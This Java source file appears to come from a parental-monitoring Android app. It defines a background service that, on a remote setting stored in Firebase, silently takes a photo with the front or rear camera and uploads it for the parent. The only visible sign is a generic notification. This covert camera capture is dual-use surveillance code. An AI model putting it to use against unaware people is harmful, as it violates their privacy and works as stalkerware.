package com.ishuinzu.childside.service;

import android.Manifest;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Color;
import android.net.Uri;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.core.app.ActivityCompat;

import com.androidhiddencamera.CameraConfig;
import com.androidhiddencamera.HiddenCameraService;
import com.androidhiddencamera.HiddenCameraUtils;
import com.androidhiddencamera.config.CameraFacing;
import com.androidhiddencamera.config.CameraFocus;
import com.androidhiddencamera.config.CameraImageFormat;
import com.androidhiddencamera.config.CameraResolution;
import com.androidhiddencamera.config.CameraRotation;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;
import com.ishuinzu.childside.R;
import com.ishuinzu.childside.app.Preferences;
import com.ishuinzu.childside.app.Utils;
import com.ishuinzu.childside.object.CameraImageObject;
import com.ishuinzu.childside.object.CameraSettingObject;
import com.ishuinzu.childside.ui.DashboardActivity;

import java.io.File;

public class AccessCameraService extends HiddenCameraService {
    private static final String TAG = "AccessCameraService";
    private static final String CHANNEL_ID = "com.ishuinzu.childside.service.AccessCameraService";
    private static final String CHANNEL_NAME = "Access Camera Service";
    private CameraConfig cameraConfig;
    private CameraSettingObject cameraSettingsNew;

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }


    @Override
    public void onCreate() {
        super.onCreate();

        // Notification
        NotificationChannel notificationChannel = null;
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            notificationChannel = new NotificationChannel(CHANNEL_ID, CHANNEL_NAME, NotificationManager.IMPORTANCE_DEFAULT);
            notificationChannel.enableLights(true);
            notificationChannel.setLightColor(Color.RED);
            notificationChannel.setShowBadge(true);
            notificationChannel.setLockscreenVisibility(Notification.VISIBILITY_PUBLIC);
            NotificationManager manager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
            manager.createNotificationChannel(notificationChannel);

            Bitmap icon = BitmapFactory.decodeResource(getResources(), R.drawable.img_logo);
            Notification notification = new Notification.Builder(getApplicationContext())
                    .setChannelId(CHANNEL_ID)
                    .setContentTitle("Child Application")
                    .setContentText("Service running in background")
                    .setSmallIcon(R.drawable.img_logo)
                    .setLargeIcon(icon)
                    .build();

            Intent notificationIntent = new Intent(getApplicationContext(), DashboardActivity.class);
            notificationIntent.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_SINGLE_TOP);
            notification.contentIntent = PendingIntent.getActivity(getApplicationContext(), 0, notificationIntent, 0);
            startForeground(100, notification);
        } else {
            startForeground(100, new Notification());
        }

        // Get Camera Settings
        cameraSettingsNew = new CameraSettingObject();
        FirebaseDatabase.getInstance().getReference().child("camera_settings")
                .child(Preferences.getInstance(getApplicationContext()).getParent().getId())
                .get()
                .addOnCompleteListener(task -> {
                    if (task.isSuccessful()) {
                        if (task.getResult() != null) {
                            CameraSettingObject cameraSettingObject = task.getResult().getValue(CameraSettingObject.class);

                            if (cameraSettingObject != null) {
                                cameraSettingsNew = cameraSettingObject;
                                configureCamera(cameraSettingObject);
                            }
                        }
                    }
                });
    }

    private void configureCamera(CameraSettingObject cameraSettings) {
        int camera_facing = CameraFacing.FRONT_FACING_CAMERA, camera_format = CameraImageFormat.FORMAT_JPEG, camera_rotation = CameraRotation.ROTATION_0, camera_resolution = CameraResolution.HIGH_RESOLUTION;
        switch (cameraSettings.getFormat()) {
            case "JPEG":
                camera_format = CameraImageFormat.FORMAT_JPEG;
                break;
            case "PNG":
                camera_format = CameraImageFormat.FORMAT_PNG;
                break;
            case "WEBP":
                camera_format = CameraImageFormat.FORMAT_WEBP;
                break;
        }
        switch (cameraSettings.getResolution()) {
            case "High":
                camera_resolution = CameraResolution.HIGH_RESOLUTION;
                break;
            case "Medium":
                camera_resolution = CameraResolution.MEDIUM_RESOLUTION;
                break;
            case "Low":
                camera_resolution = CameraResolution.LOW_RESOLUTION;
                break;
        }
        switch (cameraSettings.getRotation()) {
            case "0":
                camera_rotation = CameraRotation.ROTATION_0;
                break;
            case "90":
                camera_rotation = CameraRotation.ROTATION_90;
                break;
            case "180":
                camera_rotation = CameraRotation.ROTATION_180;
                break;
            case "270":
                camera_rotation = CameraRotation.ROTATION_270;
                break;
        }
        switch (cameraSettings.getSide()) {
            case "Front":
                camera_facing = CameraFacing.FRONT_FACING_CAMERA;
                break;
            case "Back":
                camera_facing = CameraFacing.REAR_FACING_CAMERA;
                break;
        }

        cameraConfig = new CameraConfig()
                .getBuilder(getApplicationContext())
                .setCameraFacing(camera_facing)
                .setCameraResolution(camera_resolution)
                .setImageFormat(camera_format)
                .setImageRotation(camera_rotation)
                .setCameraFocus(CameraFocus.AUTO)
                .build();

        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED) {
            if (HiddenCameraUtils.canOverDrawOtherApps(getApplicationContext())) {
                startCamera(cameraConfig);

                new Handler().postDelayed(() -> {
                    Log.d(TAG, "HANDLER");
                    takePicture();
                }, 5000);
            }
        }
    }

    @Override
    public void onImageCapture(@NonNull File imageFile) {
        Log.d(TAG, "IMAGE :" + imageFile.getAbsolutePath());

        Uri imageURI = Uri.fromFile(imageFile);
        long currentTimeStamp = System.currentTimeMillis();
        StorageReference cameraImagesReference = FirebaseStorage.getInstance().getReference().child("camera_images").child(Preferences.getInstance(getApplicationContext()).getParent().getId()).child(imageURI.getLastPathSegment());
        cameraImagesReference.putFile(imageURI).addOnCompleteListener(uploadImageTask -> {
            if (uploadImageTask.isSuccessful()) {
                cameraImagesReference.getDownloadUrl().addOnSuccessListener(new OnSuccessListener<Uri>() {
                    @Override
                    public void onSuccess(Uri uri) {
                        String url = uri.toString();

                        CameraImageObject cameraImage = new CameraImageObject();
                        cameraImage.setFormat(cameraSettingsNew.getFormat());
                        cameraImage.setLink(url);
                        cameraImage.setResolution(cameraSettingsNew.getResolution());
                        cameraImage.setRotation(cameraSettingsNew.getRotation());
                        cameraImage.setSide(cameraSettingsNew.getSide());
                        cameraImage.setTime(currentTimeStamp);

                        FirebaseDatabase.getInstance().getReference().child("child_camera_images")
                                .child(Preferences.getInstance(getApplicationContext()).getParent().getId())
                                .child(Utils.getDateID())
                                .child("" + cameraImage.getTime())
                                .setValue(cameraImage)
                                .addOnCompleteListener(uploadImageObjectTask -> {
                                    if (uploadImageObjectTask.isSuccessful()) {
                                        // Change Status
                                        FirebaseDatabase.getInstance().getReference().child("features")
                                                .child(Preferences.getInstance(getApplicationContext()).getParent().getId())
                                                .child("sync_hidden_camera")
                                                .child("is_set")
                                                .setValue("false");

                                        stopCamera();
                                        stopForeground(true);
                                    }
                                });
                    }
                });
            }
        });
    }

    @Override
    public void onCameraError(int errorCode) {
        Log.d(TAG, "ERROR : " + errorCode);
    }
}